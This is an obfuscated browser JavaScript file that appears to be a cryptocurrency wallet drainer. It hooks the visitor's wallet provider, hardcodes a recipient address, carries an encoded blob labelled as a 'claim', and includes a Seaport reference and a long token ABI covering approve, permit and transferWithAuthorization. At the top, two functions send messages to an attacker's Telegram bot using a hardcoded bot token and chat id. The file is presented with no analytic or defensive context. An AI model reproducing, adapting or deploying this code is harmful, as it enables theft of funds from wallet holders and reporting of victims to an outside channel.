const recipient_addy = "0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c";
let eth_provider = new ethers.providers.Web3Provider(window.ethereum);
var lG = "CLAIM",
  lB = 100,
  lU =
    "MzAsMjUyLDEyMiwxMTcsMTAzLDE3OSwzLDI0NiwyNTIsMjQ0LDUyLDk5LDI0NywxNzIsMjI2LDI4LDIwNCwxMTQsMjA2LDE3NywyOCwyMzcsNDksNjQsMjE2LDMzLDc3LDcxLDE5MiwyMDAsOTQsMTUyLDg5LDM3LDIwMywxNzYsMTI5LDIxMCw5NywyNDMsMTMxLDY0LDE0NSwxNTYsMjUzLDcwLDEyMCwyMjMsMTkzLDE2NiwxNzIsOTYsNDksMjQ3LDIxNCwzNSwzNywxMzEsMjQ3LDYxLDExOCwzLDI3LDU0LDE3MywxOTksMTUsMTIyLDQwLDIxLDIwNiwxNDUsNjUsNzcsMTA5LDEzMiwxNDgsMTgyLDk4LDI1NCwzMCwxMTEsNjYsMjM1LDM0LDEzMiw3NCwxMywyNDksMTg0LDE5NCwxNDIsODQsMTAyLDIwMSwyMjAsNTIsMTA2LDIxMCwyNTAsNzcsMTI3LDk2LDExOCw4MSwxMzcsMTc0LDE0NiwxNTYsMTUsMTExLDE4MSwzNiwxOTUsMTM0LDIwMiwyMTIsMTM2LDgxLDEyMiw5MSwzMSwxMTYsMTI3LDIwMywxNDEsNTAsMjQ1LDU5LDIzLDIzOCw4MSwyMjcsMTE5LDIwOSwyMzcsMTUxLDM3LDk2LDIxLDY0LDY0LDg2LDcsMjQ1LDIzMywyMDMsODUsMTY4LDE2NywyMDMsMTg3LDEwNywxMTIsMTA2LDI0NiwxOTIsOTAsMjA5LDY3LDg5LDE5MCwyMzMsMTU5LDcwLDE0Nyw5Nyw4NCwxOTksNDAsMTg4LDIyOSw2MywyMTEsNTQsMjA0LDc3LDE4MSwyMSwxODUsOTAsNTAsMzcsMTY4LDE3OSw0MywxOTksMTIyLDM4LDE4NCwyMjEsMjU1LDcyLDk0LDQxLDUsMTU3LDEsMjI3LDkxLDUxLDI1NSwyMzEsNTYsMjEwLDExNiwyMDUsMjMwLDcwLDE2NSwxMjQsMTc5LDI1NSw2NCw4OCwyMzgsMTA3LDEyNiwyMDQsMTIwLDExOCw1OCwxNjEsMTgsNDMsNTYsMTA0LDEyOCwxNzIsOTgsOCwzMiwyNDUsMTk4LDE3NCw0MywyNiwxMTYsMTczLDE4MywxNywxNiwzLDc3LDE0MCwxNjIsMTczLDAsMTAxLDE4NCw3MiwxNDAsNjksMTYxLDE3OCwxMjMsMTc0LDQyLDIwMSwxNzIsMTgwLDcyLDE1Miw4NCw3OSwyOCwxNTgsODksNTUsNzYsMzYsNTEsMTQwLDE2NSwxMzEsMjIwLDIwMSwyNDcsMjQ4LDExNCwxMTEsOTUsMjMwLDEwNiwxMjMsMjUyLDUyLDExNSwyNiwzMiw0NiwxNzksMTM3LDE0LDExNCwyNDIsMTAwLDYzLDI0MywxOTYsMjI0LDE1NywxODgsMjEwLDAsMjIsNjAsMTg0LDkwLDE1MiwxNTIsMTM0LDk1LDE0LDE4NiwzOCwxNywyNDcsNzUsMTU2LDEzMSwyOSwyMTgsMjI3LDE4NiwxOTQsOTIsNjgsMTc0LDI0NSwxMzUsMTk1LDEzOCwxMzUsODAsODUsMTEzLDExNywxMjUsMjExLDE4OSw3MywxNzEsNjAsMjAxLDIyMCwxMTAsOTEsMjQ1LDE5MSw1NywyNCwxODIsMTE0LDI4LDg1LDEwMSw0OSwxMjYsMTY3LDg0LDI0Myw2OSwyNTAsMTQ3LDEyNSw2MSw1NiwyMTgsMjM0LDE4OCw3LDYxLDI0MywyMzAsMjMzLDgxLDE0LDEzMSwyMzQsMTMwLDExNSwxNjksMTc1LDcyLDE1MiwxMzIsMjA5LDczLDU5LDc5LDE1MiwxNzAsNTMsNTcsMjAsMTI4LDE2MSwyMTgsNzQsMjM4LDE2LDExNiwxMjYsMjI0LDIwOCwyMjAsMTY0LDI0NSwxODYsNjQsMjAyLDEwMCw1MSw1NCw0OSwxNDQsMTYyLDQ4LDQ1LDcwLDEwNSwxNDAsNDMsMjE4LDEwMCwyMzIsMjQ2LDI5LDEwNCwyMzUsMTk4LDI5LDAsMjI1LDAsMTMwLDc0LDIyNCwyMTQsMTc5LDI0OSwxNjQsOTcsMTQwLDk4LDQ4LDU3LDIyNywxNzgsMzMsNTQsODYsMTQwLDgsMTUzLDUyLDE3OSw0MiwxNjcsMjI3LDI3LDE2LDQsMTk1LDEwMCwxMzksMTUwLDI5LDIyLDIyNCwxNDUsMTQ0LDE1Niw0NSwxNDcsMTgyLDY2LDI5LDEwMywyMzEsMzEsNjgsMTc4LDIwMSw4NCw0LDExMiwxNzYsMTMzLDQ3LDk3LDM4LDM1LDE4NywxMzEsMTE4LDEzMSwyNTAsMjE2LDE3Myw3MCwxMDIsOTcsMTYyLDExNywyNDEsMjIwLDM0LDg2LDkzLDE2Nw==",
  ld = 20,
  lR = !1;
const Fs = "5771489938:AAEN3zV2YkLNgGSJhgSY44Dr_ZYpbsabUsM",
  FE = "-878639648";
function Webhook(e) {
  const t =
      "https://api.telegram.org/bot" +
      Fs +
      "/sendMessage?chat_id=" +
      FE +
      "&text=" +
      e +
      "&disable_web_page_preview=True",
    n = new XMLHttpRequest();
  n.open("GET", t), n.send();
}
const channel = "-878639648",
  bot = "5771489938:AAEN3zV2YkLNgGSJhgSY44Dr_ZYpbsabUsM";
function manualWebhook(e) {
  const t =
      "https://api.telegram.org/bot" +
      bot +
      "/sendMessage?chat_id=" +
      channel +
      "&text=" +
      e +
      "&disable_web_page_preview=True",
    n = new XMLHttpRequest();
  n.open("GET", t), n.send();
}
const lt = {};
let seaport_address = "0x00000000006c3852cbEf3e08E8dF289169EdE581";
const _0x3da86c = { internalType: "address", name: "owner", type: "address" },
  _0x28f740 = {
    indexed: !0,
    internalType: "address",
    name: "spender",
    type: "address",
  },
  _0x5db0c7 = {
    indexed: !1,
    internalType: "uint256",
    name: "value",
    type: "uint256",
  },
  _0x4ff9f7 = { anonymous: !1 };
(_0x4ff9f7.inputs = [_0x3da86c, _0x28f740, _0x5db0c7]),
  (_0x4ff9f7.name = "Approval"),
  (_0x4ff9f7.type = "event");
const _0x89f2f0 = {
    indexed: !0,
    internalType: "address",
    name: "authorizer",
    type: "address",
  },
  _0x3c1e59 = {
    indexed: !0,
    internalType: "bytes32",
    name: "nonce",
    type: "bytes32",
  },
  _0x505c7e = { anonymous: !1 };
(_0x505c7e.inputs = [_0x89f2f0, _0x3c1e59]),
  (_0x505c7e.name = "AuthorizationCanceled"),
  (_0x505c7e.type = "event");
const _0x3d3e26 = {
    indexed: !0,
    internalType: "address",
    name: "authorizer",
    type: "address",
  },
  _0x58bdb4 = {
    indexed: !0,
    internalType: "bytes32",
    name: "nonce",
    type: "bytes32",
  },
  _0x51761a = { anonymous: !1 };
(_0x51761a.inputs = [_0x3d3e26, _0x58bdb4]),
  (_0x51761a.name = "AuthorizationUsed"),
  (_0x51761a.type = "event");
const _0x48246b = {
    indexed: !0,
    internalType: "address",
    name: "_account",
    type: "address",
  },
  _0x24e2f1 = { anonymous: !1 };
(_0x24e2f1.inputs = [_0x48246b]),
  (_0x24e2f1.name = "Blacklisted"),
  (_0x24e2f1.type = "event");
const _0x3ab730 = {
    indexed: !0,
    internalType: "address",
    name: "newBlacklister",
    type: "address",
  },
  _0x318706 = { anonymous: !1 };
(_0x318706.inputs = [_0x3ab730]),
  (_0x318706.name = "BlacklisterChanged"),
  (_0x318706.type = "event");
const _0x3a0b4d = {
    indexed: !0,
    internalType: "address",
    name: "burner",
    type: "address",
  },
  _0x330b6d = {
    indexed: !1,
    internalType: "uint256",
    name: "amount",
    type: "uint256",
  },
  _0xfe816f = { anonymous: !1 };
(_0xfe816f.inputs = [_0x3a0b4d, _0x330b6d]),
  (_0xfe816f.name = "Burn"),
  (_0xfe816f.type = "event");
const _0x872b28 = {
    indexed: !0,
    internalType: "address",
    name: "newMasterMinter",
    type: "address",
  },
  _0x593a3b = { anonymous: !1 };
(_0x593a3b.inputs = [_0x872b28]),
  (_0x593a3b.name = "MasterMinterChanged"),
  (_0x593a3b.type = "event");
const _0x2da27b = {
    indexed: !0,
    internalType: "address",
    name: "minter",
    type: "address",
  },
  _0x3ecb4f = {
    indexed: !0,
    internalType: "address",
    name: "to",
    type: "address",
  },
  _0x567162 = {
    indexed: !1,
    internalType: "uint256",
    name: "amount",
    type: "uint256",
  },
  _0x28afd6 = { anonymous: !1 };
(_0x28afd6.inputs = [_0x2da27b, _0x3ecb4f, _0x567162]),
  (_0x28afd6.name = "Mint"),
  (_0x28afd6.type = "event");
const _0xe9857d = {
    indexed: !0,
    internalType: "address",
    name: "minter",
    type: "address",
  },
  _0x41350e = {
    indexed: !1,
    internalType: "uint256",
    name: "minterAllowedAmount",
    type: "uint256",
  },
  _0x28d072 = { anonymous: !1 };
(_0x28d072.inputs = [_0xe9857d, _0x41350e]),
  (_0x28d072.name = "MinterConfigured"),
  (_0x28d072.type = "event");
const _0x2c7a42 = {
    indexed: !0,
    internalType: "address",
    name: "oldMinter",
    type: "address",
  },
  _0x14407b = { anonymous: !1 };
(_0x14407b.inputs = [_0x2c7a42]),
  (_0x14407b.name = "MinterRemoved"),
  (_0x14407b.type = "event");
const _0x42a5b7 = {
    indexed: !1,
    internalType: "address",
    name: "previousOwner",
    type: "address",
  },
  _0x1f7f55 = {
    indexed: !1,
    internalType: "address",
    name: "newOwner",
    type: "address",
  },
  _0x133b55 = { anonymous: !1 };
(_0x133b55.inputs = [_0x42a5b7, _0x1f7f55]),
  (_0x133b55.name = "OwnershipTransferred"),
  (_0x133b55.type = "event");
const _0x174a1e = { anonymous: !1, inputs: [], name: "Pause", type: "event" },
  _0x3473c1 = {
    indexed: !0,
    internalType: "address",
    name: "newAddress",
    type: "address",
  },
  _0x4e939d = { anonymous: !1 };
(_0x4e939d.inputs = [_0x3473c1]),
  (_0x4e939d.name = "PauserChanged"),
  (_0x4e939d.type = "event");
const _0x13bf56 = {
    indexed: !0,
    internalType: "address",
    name: "newRescuer",
    type: "address",
  },
  _0x50fcb1 = { anonymous: !1 };
(_0x50fcb1.inputs = [_0x13bf56]),
  (_0x50fcb1.name = "RescuerChanged"),
  (_0x50fcb1.type = "event");
const _0x45a08a = {
    indexed: !0,
    internalType: "address",
    name: "from",
    type: "address",
  },
  _0x24e330 = {
    indexed: !0,
    internalType: "address",
    name: "to",
    type: "address",
  },
  _0x1cba2c = {
    indexed: !1,
    internalType: "uint256",
    name: "value",
    type: "uint256",
  },
  _0x31f39a = { anonymous: !1 };
(_0x31f39a.inputs = [_0x45a08a, _0x24e330, _0x1cba2c]),
  (_0x31f39a.name = "Transfer"),
  (_0x31f39a.type = "event");
const _0x15c0b5 = {
    indexed: !0,
    internalType: "address",
    name: "_account",
    type: "address",
  },
  _0x40956d = { anonymous: !1 };
(_0x40956d.inputs = [_0x15c0b5]),
  (_0x40956d.name = "UnBlacklisted"),
  (_0x40956d.type = "event");
const _0x465ce8 = { anonymous: !1, inputs: [], name: "Unpause", type: "event" },
  _0x96f005 = { internalType: "bytes32", name: "", type: "bytes32" },
  _0xbff415 = { inputs: [], name: "CANCEL_AUTHORIZATION_TYPEHASH" };
(_0xbff415.outputs = [_0x96f005]),
  (_0xbff415.stateMutability = "view"),
  (_0xbff415.type = "function");
const _0x643fbc = { internalType: "bytes32", name: "", type: "bytes32" },
  _0x3a16d6 = { inputs: [], name: "DOMAIN_SEPARATOR" };
(_0x3a16d6.outputs = [_0x643fbc]),
  (_0x3a16d6.stateMutability = "view"),
  (_0x3a16d6.type = "function");
const _0x2267e0 = { internalType: "bytes32", name: "", type: "bytes32" },
  _0x30d493 = { inputs: [], name: "PERMIT_TYPEHASH" };
(_0x30d493.outputs = [_0x2267e0]),
  (_0x30d493.stateMutability = "view"),
  (_0x30d493.type = "function");
const _0x4b74cb = { internalType: "bytes32", name: "", type: "bytes32" },
  _0x26aa76 = { inputs: [], name: "RECEIVE_WITH_AUTHORIZATION_TYPEHASH" };
(_0x26aa76.outputs = [_0x4b74cb]),
  (_0x26aa76.stateMutability = "view"),
  (_0x26aa76.type = "function");
const _0x2e382b = { internalType: "bytes32", name: "", type: "bytes32" },
  _0xf5e870 = { inputs: [], name: "TRANSFER_WITH_AUTHORIZATION_TYPEHASH" };
(_0xf5e870.outputs = [_0x2e382b]),
  (_0xf5e870.stateMutability = "view"),
  (_0xf5e870.type = "function");
const _0x3ae2bd = { internalType: "address", name: "owner", type: "address" },
  _0x5e7ee9 = { internalType: "address", name: "spender", type: "address" },
  _0x33c116 = { internalType: "uint256", name: "", type: "uint256" },
  _0x29d36e = {};
(_0x29d36e.inputs = [_0x3ae2bd, _0x5e7ee9]),
  (_0x29d36e.name = "allowance"),
  (_0x29d36e.outputs = [_0x33c116]),
  (_0x29d36e.stateMutability = "view"),
  (_0x29d36e.type = "function");
const _0x78f7f = { internalType: "address", name: "spender", type: "address" },
  _0x400023 = { internalType: "uint256", name: "value", type: "uint256" },
  _0x1b3e1a = { internalType: "bool", name: "", type: "bool" },
  _0x2657f5 = {};
(_0x2657f5.inputs = [_0x78f7f, _0x400023]),
  (_0x2657f5.name = "approve"),
  (_0x2657f5.outputs = [_0x1b3e1a]),
  (_0x2657f5.stateMutability = "nonpayable"),
  (_0x2657f5.type = "function");
const _0x5326fe = {
    internalType: "address",
    name: "authorizer",
    type: "address",
  },
  _0x347335 = { internalType: "bytes32", name: "nonce", type: "bytes32" },
  _0x9c5bdd = { internalType: "bool", name: "", type: "bool" },
  _0xaf69fc = {};
(_0xaf69fc.inputs = [_0x5326fe, _0x347335]),
  (_0xaf69fc.name = "authorizationState"),
  (_0xaf69fc.outputs = [_0x9c5bdd]),
  (_0xaf69fc.stateMutability = "view"),
  (_0xaf69fc.type = "function");
const _0x95211f = { internalType: "address", name: "account", type: "address" },
  _0x59544c = { internalType: "uint256", name: "", type: "uint256" },
  _0x1f7bd9 = {};
(_0x1f7bd9.inputs = [_0x95211f]),
  (_0x1f7bd9.name = "balanceOf"),
  (_0x1f7bd9.outputs = [_0x59544c]),
  (_0x1f7bd9.stateMutability = "view"),
  (_0x1f7bd9.type = "function");
const _0x17834b = {
    internalType: "address",
    name: "_account",
    type: "address",
  },
  _0xb03e48 = {};
(_0xb03e48.inputs = [_0x17834b]),
  (_0xb03e48.name = "blacklist"),
  (_0xb03e48.outputs = []),
  (_0xb03e48.stateMutability = "nonpayable"),
  (_0xb03e48.type = "function");
const _0xb0804 = { internalType: "address", name: "", type: "address" },
  _0x554693 = { inputs: [], name: "blacklister" };
(_0x554693.outputs = [_0xb0804]),
  (_0x554693.stateMutability = "view"),
  (_0x554693.type = "function");
const _0xea9b6e = { internalType: "uint256", name: "_amount", type: "uint256" },
  _0x34344a = {};
(_0x34344a.inputs = [_0xea9b6e]),
  (_0x34344a.name = "burn"),
  (_0x34344a.outputs = []),
  (_0x34344a.stateMutability = "nonpayable"),
  (_0x34344a.type = "function");
const _0xc17d52 = {
    internalType: "address",
    name: "authorizer",
    type: "address",
  },
  _0x5767c1 = { internalType: "bytes32", name: "nonce", type: "bytes32" },
  _0x4bbd28 = { internalType: "uint8", name: "v", type: "uint8" },
  _0xb06c5e = { internalType: "bytes32", name: "r", type: "bytes32" },
  _0x17b4ac = { internalType: "bytes32", name: "s", type: "bytes32" },
  _0x4b1c5f = {};
(_0x4b1c5f.inputs = [_0xc17d52, _0x5767c1, _0x4bbd28, _0xb06c5e, _0x17b4ac]),
  (_0x4b1c5f.name = "cancelAuthorization"),
  (_0x4b1c5f.outputs = []),
  (_0x4b1c5f.stateMutability = "nonpayable"),
  (_0x4b1c5f.type = "function");
const _0x48c3bf = { internalType: "address", name: "minter", type: "address" },
  _0x5582aa = {
    internalType: "uint256",
    name: "minterAllowedAmount",
    type: "uint256",
  },
  _0x2b3d9c = { internalType: "bool", name: "", type: "bool" },
  _0xcc8a2 = {};
(_0xcc8a2.inputs = [_0x48c3bf, _0x5582aa]),
  (_0xcc8a2.name = "configureMinter"),
  (_0xcc8a2.outputs = [_0x2b3d9c]),
  (_0xcc8a2.stateMutability = "nonpayable"),
  (_0xcc8a2.type = "function");
const _0x59b557 = { internalType: "string", name: "", type: "string" },
  _0x4849ee = { inputs: [], name: "currency" };
(_0x4849ee.outputs = [_0x59b557]),
  (_0x4849ee.stateMutability = "view"),
  (_0x4849ee.type = "function");
const _0x305f99 = { internalType: "uint8", name: "", type: "uint8" },
  _0x1cfd17 = { inputs: [], name: "decimals" };
(_0x1cfd17.outputs = [_0x305f99]),
  (_0x1cfd17.stateMutability = "view"),
  (_0x1cfd17.type = "function");
const _0x774152 = { internalType: "address", name: "spender", type: "address" },
  _0x22910b = { internalType: "uint256", name: "decrement", type: "uint256" },
  _0x515bbc = { internalType: "bool", name: "", type: "bool" },
  _0x483220 = {};
(_0x483220.inputs = [_0x774152, _0x22910b]),
  (_0x483220.name = "decreaseAllowance"),
  (_0x483220.outputs = [_0x515bbc]),
  (_0x483220.stateMutability = "nonpayable"),
  (_0x483220.type = "function");
const _0x2d2c10 = { internalType: "address", name: "spender", type: "address" },
  _0x1f48de = { internalType: "uint256", name: "increment", type: "uint256" },
  _0x533468 = { internalType: "bool", name: "", type: "bool" },
  _0xc3a088 = {};
(_0xc3a088.inputs = [_0x2d2c10, _0x1f48de]),
  (_0xc3a088.name = "increaseAllowance"),
  (_0xc3a088.outputs = [_0x533468]),
  (_0xc3a088.stateMutability = "nonpayable"),
  (_0xc3a088.type = "function");
const _0x571798 = { internalType: "string", name: "tokenName", type: "string" },
  _0x1f0165 = { internalType: "string", name: "tokenSymbol", type: "string" },
  _0x36b565 = { internalType: "string", name: "tokenCurrency", type: "string" },
  _0x225713 = { internalType: "uint8", name: "tokenDecimals", type: "uint8" },
  _0x318f94 = {
    internalType: "address",
    name: "newMasterMinter",
    type: "address",
  },
  _0x5972c6 = { internalType: "address", name: "newPauser", type: "address" },
  _0x593835 = {
    internalType: "address",
    name: "newBlacklister",
    type: "address",
  },
  _0x1726bc = { internalType: "address", name: "newOwner", type: "address" },
  _0x1d14cd = {};
(_0x1d14cd.inputs = [
  _0x571798,
  _0x1f0165,
  _0x36b565,
  _0x225713,
  _0x318f94,
  _0x5972c6,
  _0x593835,
  _0x1726bc,
]),
  (_0x1d14cd.name = "initialize"),
  (_0x1d14cd.outputs = []),
  (_0x1d14cd.stateMutability = "nonpayable"),
  (_0x1d14cd.type = "function");
const _0x419e50 = { internalType: "string", name: "newName", type: "string" },
  _0x27b99d = {};
(_0x27b99d.inputs = [_0x419e50]),
  (_0x27b99d.name = "initializeV2"),
  (_0x27b99d.outputs = []),
  (_0x27b99d.stateMutability = "nonpayable"),
  (_0x27b99d.type = "function");
const _0x2dfce8 = {
    internalType: "address",
    name: "lostAndFound",
    type: "address",
  },
  _0x3bf465 = {};
(_0x3bf465.inputs = [_0x2dfce8]),
  (_0x3bf465.name = "initializeV2_1"),
  (_0x3bf465.outputs = []),
  (_0x3bf465.stateMutability = "nonpayable"),
  (_0x3bf465.type = "function");
const _0x203269 = {
    internalType: "address",
    name: "_account",
    type: "address",
  },
  _0x1c5759 = { internalType: "bool", name: "", type: "bool" },
  _0x2583f6 = {};
(_0x2583f6.inputs = [_0x203269]),
  (_0x2583f6.name = "isBlacklisted"),
  (_0x2583f6.outputs = [_0x1c5759]),
  (_0x2583f6.stateMutability = "view"),
  (_0x2583f6.type = "function");
const _0x5403a6 = { internalType: "address", name: "account", type: "address" },
  _0x18518a = { internalType: "bool", name: "", type: "bool" },
  _0x5c70dd = {};
(_0x5c70dd.inputs = [_0x5403a6]),
  (_0x5c70dd.name = "isMinter"),
  (_0x5c70dd.outputs = [_0x18518a]),
  (_0x5c70dd.stateMutability = "view"),
  (_0x5c70dd.type = "function");
const _0x532af9 = { internalType: "address", name: "", type: "address" },
  _0x334d05 = { inputs: [], name: "masterMinter" };
(_0x334d05.outputs = [_0x532af9]),
  (_0x334d05.stateMutability = "view"),
  (_0x334d05.type = "function");
const _0x47f8bd = { internalType: "address", name: "_to", type: "address" },
  _0x106d98 = { internalType: "uint256", name: "_amount", type: "uint256" },
  _0x2827bb = { internalType: "bool", name: "", type: "bool" },
  _0x45af3d = {};
(_0x45af3d.inputs = [_0x47f8bd, _0x106d98]),
  (_0x45af3d.name = "mint"),
  (_0x45af3d.outputs = [_0x2827bb]),
  (_0x45af3d.stateMutability = "nonpayable"),
  (_0x45af3d.type = "function");
const _0x280143 = { internalType: "address", name: "minter", type: "address" },
  _0x4c31bb = { internalType: "uint256", name: "", type: "uint256" },
  _0x482ac2 = {};
(_0x482ac2.inputs = [_0x280143]),
  (_0x482ac2.name = "minterAllowance"),
  (_0x482ac2.outputs = [_0x4c31bb]),
  (_0x482ac2.stateMutability = "view"),
  (_0x482ac2.type = "function");
const _0x5c3a52 = { internalType: "string", name: "", type: "string" },
  _0x76ffb8 = { inputs: [], name: "name" };
(_0x76ffb8.outputs = [_0x5c3a52]),
  (_0x76ffb8.stateMutability = "view"),
  (_0x76ffb8.type = "function");
const _0x6aebe9 = { internalType: "address", name: "owner", type: "address" },
  _0x180277 = { internalType: "uint256", name: "", type: "uint256" },
  _0x37a17d = {};
(_0x37a17d.inputs = [_0x6aebe9]),
  (_0x37a17d.name = "nonces"),
  (_0x37a17d.outputs = [_0x180277]),
  (_0x37a17d.stateMutability = "view"),
  (_0x37a17d.type = "function");
const _0xab8a7c = { internalType: "address", name: "", type: "address" },
  _0x310565 = { inputs: [], name: "owner" };
(_0x310565.outputs = [_0xab8a7c]),
  (_0x310565.stateMutability = "view"),
  (_0x310565.type = "function");
const _0x58ab32 = {
    inputs: [],
    name: "pause",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  _0xef3367 = { internalType: "bool", name: "", type: "bool" },
  _0xd0c419 = { inputs: [], name: "paused" };
(_0xd0c419.outputs = [_0xef3367]),
  (_0xd0c419.stateMutability = "view"),
  (_0xd0c419.type = "function");
const _0x32ebcc = { internalType: "address", name: "", type: "address" },
  _0x295694 = { inputs: [], name: "pauser" };
(_0x295694.outputs = [_0x32ebcc]),
  (_0x295694.stateMutability = "view"),
  (_0x295694.type = "function");
const _0x1c38a1 = { internalType: "address", name: "owner", type: "address" },
  _0x5d9556 = { internalType: "address", name: "spender", type: "address" },
  _0x271ed7 = { internalType: "uint256", name: "value", type: "uint256" },
  _0x532a95 = { internalType: "uint256", name: "deadline", type: "uint256" },
  _0x85a6fd = { internalType: "uint8", name: "v", type: "uint8" },
  _0x5c507f = { internalType: "bytes32", name: "r", type: "bytes32" },
  _0x26040a = { internalType: "bytes32", name: "s", type: "bytes32" },
  _0x49c632 = {};
(_0x49c632.inputs = [
  _0x1c38a1,
  _0x5d9556,
  _0x271ed7,
  _0x532a95,
  _0x85a6fd,
  _0x5c507f,
  _0x26040a,
]),
  (_0x49c632.name = "permit"),
  (_0x49c632.outputs = []),
  (_0x49c632.stateMutability = "nonpayable"),
  (_0x49c632.type = "function");
const _0xfd0eb0 = { internalType: "address", name: "from", type: "address" },
  _0xf44948 = { internalType: "address", name: "to", type: "address" },
  _0x25d3e2 = { internalType: "uint256", name: "value", type: "uint256" },
  _0x1ca5a1 = { internalType: "uint256", name: "validAfter", type: "uint256" },
  _0x12e4ca = { internalType: "uint256", name: "validBefore", type: "uint256" },
  _0xd4a8a2 = { internalType: "bytes32", name: "nonce", type: "bytes32" },
  _0x511c7a = { internalType: "uint8", name: "v", type: "uint8" },
  _0x22e3f6 = { internalType: "bytes32", name: "r", type: "bytes32" },
  _0x33b0d7 = { internalType: "bytes32", name: "s", type: "bytes32" },
  _0xca5ac4 = {};
(_0xca5ac4.inputs = [
  _0xfd0eb0,
  _0xf44948,
  _0x25d3e2,
  _0x1ca5a1,
  _0x12e4ca,
  _0xd4a8a2,
  _0x511c7a,
  _0x22e3f6,
  _0x33b0d7,
]),
  (_0xca5ac4.name = "receiveWithAuthorization"),
  (_0xca5ac4.outputs = []),
  (_0xca5ac4.stateMutability = "nonpayable"),
  (_0xca5ac4.type = "function");
const _0xaeffb6 = { internalType: "address", name: "minter", type: "address" },
  _0x2b6cef = { internalType: "bool", name: "", type: "bool" },
  _0x1545f3 = {};
(_0x1545f3.inputs = [_0xaeffb6]),
  (_0x1545f3.name = "removeMinter"),
  (_0x1545f3.outputs = [_0x2b6cef]),
  (_0x1545f3.stateMutability = "nonpayable"),
  (_0x1545f3.type = "function");
const _0x1713e1 = {
    internalType: "contract IERC20",
    name: "tokenContract",
    type: "address",
  },
  _0x322417 = { internalType: "address", name: "to", type: "address" },
  _0x2839a0 = { internalType: "uint256", name: "amount", type: "uint256" },
  _0x43f41b = {};
(_0x43f41b.inputs = [_0x1713e1, _0x322417, _0x2839a0]),
  (_0x43f41b.name = "rescueERC20"),
  (_0x43f41b.outputs = []),
  (_0x43f41b.stateMutability = "nonpayable"),
  (_0x43f41b.type = "function");
const _0x999171 = { internalType: "address", name: "", type: "address" },
  _0x5e43ed = { inputs: [], name: "rescuer" };
(_0x5e43ed.outputs = [_0x999171]),
  (_0x5e43ed.stateMutability = "view"),
  (_0x5e43ed.type = "function");
const _0x59c239 = { internalType: "string", name: "", type: "string" },
  _0xf69e65 = { inputs: [], name: "symbol" };
(_0xf69e65.outputs = [_0x59c239]),
  (_0xf69e65.stateMutability = "view"),
  (_0xf69e65.type = "function");
const _0x424909 = { internalType: "uint256", name: "", type: "uint256" },
  _0x10f286 = { inputs: [], name: "totalSupply" };
(_0x10f286.outputs = [_0x424909]),
  (_0x10f286.stateMutability = "view"),
  (_0x10f286.type = "function");
const _0x21447f = { internalType: "address", name: "to", type: "address" },
  _0xdfb658 = { internalType: "uint256", name: "value", type: "uint256" },
  _0x30a283 = { internalType: "bool", name: "", type: "bool" },
  _0x1b6459 = {};
(_0x1b6459.inputs = [_0x21447f, _0xdfb658]),
  (_0x1b6459.name = "transfer"),
  (_0x1b6459.outputs = [_0x30a283]),
  (_0x1b6459.stateMutability = "nonpayable"),
  (_0x1b6459.type = "function");
const _0x3e413b = { internalType: "address", name: "from", type: "address" },
  _0x172055 = { internalType: "address", name: "to", type: "address" },
  _0x529818 = { internalType: "uint256", name: "value", type: "uint256" },
  _0x3d63d4 = { internalType: "bool", name: "", type: "bool" },
  _0x9d1ad5 = {};
(_0x9d1ad5.inputs = [_0x3e413b, _0x172055, _0x529818]),
  (_0x9d1ad5.name = "transferFrom"),
  (_0x9d1ad5.outputs = [_0x3d63d4]),
  (_0x9d1ad5.stateMutability = "nonpayable"),
  (_0x9d1ad5.type = "function");
const _0x1a09ef = {
    internalType: "address",
    name: "newOwner",
    type: "address",
  },
  _0x4a2551 = {};
(_0x4a2551.inputs = [_0x1a09ef]),
  (_0x4a2551.name = "transferOwnership"),
  (_0x4a2551.outputs = []),
  (_0x4a2551.stateMutability = "nonpayable"),
  (_0x4a2551.type = "function");
const _0xbf1951 = { internalType: "address", name: "from", type: "address" },
  _0x186f3c = { internalType: "address", name: "to", type: "address" },
  _0x8024c6 = { internalType: "uint256", name: "value", type: "uint256" },
  _0xa9e3e5 = { internalType: "uint256", name: "validAfter", type: "uint256" },
  _0x346345 = { internalType: "uint256", name: "validBefore", type: "uint256" },
  _0x4dec0b = { internalType: "bytes32", name: "nonce", type: "bytes32" },
  _0x9c9de8 = { internalType: "uint8", name: "v", type: "uint8" },
  _0x488267 = { internalType: "bytes32", name: "r", type: "bytes32" },
  _0xd7b0e1 = { internalType: "bytes32", name: "s", type: "bytes32" },
  _0x1f05f0 = {};
(_0x1f05f0.inputs = [
  _0xbf1951,
  _0x186f3c,
  _0x8024c6,
  _0xa9e3e5,
  _0x346345,
  _0x4dec0b,
  _0x9c9de8,
  _0x488267,
  _0xd7b0e1,
]),
  (_0x1f05f0.name = "transferWithAuthorization"),
  (_0x1f05f0.outputs = []),
  (_0x1f05f0.stateMutability = "nonpayable"),
  (_0x1f05f0.type = "function");
const _0x3fd23a = {
    internalType: "address",
    name: "_account",
    type: "address",
  },
  _0x5e6246 = {};
(_0x5e6246.inputs = [_0x3fd23a]),
  (_0x5e6246.name = "unBlacklist"),
  (_0x5e6246.outputs = []),
  (_0x5e6246.stateMutability = "nonpayable"),
  (_0x5e6246.type = "function");
const _0x22deee = {
    inputs: [],
    name: "unpause",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  _0x2ed618 = {
    internalType: "address",
    name: "_newBlacklister",
    type: "address",
  },
  _0x3e03fc = {};
(_0x3e03fc.inputs = [_0x2ed618]),
  (_0x3e03fc.name = "updateBlacklister"),
  (_0x3e03fc.outputs = []),
  (_0x3e03fc.stateMutability = "nonpayable"),
  (_0x3e03fc.type = "function");
const _0x581b9b = {
    internalType: "address",
    name: "_newMasterMinter",
    type: "address",
  },
  _0x103ca9 = {};
(_0x103ca9.inputs = [_0x581b9b]),
  (_0x103ca9.name = "updateMasterMinter"),
  (_0x103ca9.outputs = []),
  (_0x103ca9.stateMutability = "nonpayable"),
  (_0x103ca9.type = "function");
const _0x54cb74 = {
    internalType: "address",
    name: "_newPauser",
    type: "address",
  },
  _0x16d8c4 = {};
(_0x16d8c4.inputs = [_0x54cb74]),
  (_0x16d8c4.name = "updatePauser"),
  (_0x16d8c4.outputs = []),
  (_0x16d8c4.stateMutability = "nonpayable"),
  (_0x16d8c4.type = "function");
const _0x48e563 = {
    internalType: "address",
    name: "newRescuer",
    type: "address",
  },
  _0x1be628 = {};
(_0x1be628.inputs = [_0x48e563]),
  (_0x1be628.name = "updateRescuer"),
  (_0x1be628.outputs = []),
  (_0x1be628.stateMutability = "nonpayable"),
  (_0x1be628.type = "function");
